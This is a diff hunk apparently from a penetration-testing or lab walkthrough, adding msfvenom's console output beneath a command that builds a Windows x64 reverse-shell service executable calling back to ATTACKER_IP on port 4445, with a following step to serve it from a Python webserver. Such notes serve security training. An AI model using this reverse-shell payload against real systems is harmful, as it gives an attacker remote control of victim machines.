@@ -250,6 +250,12 @@ Successfully processed 1 files; Failed processing 0 files
 * Generate exe-service payload using `msfvenom`.
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc.exe
 ``` 
 * Serve payload through python webserver.
 ```
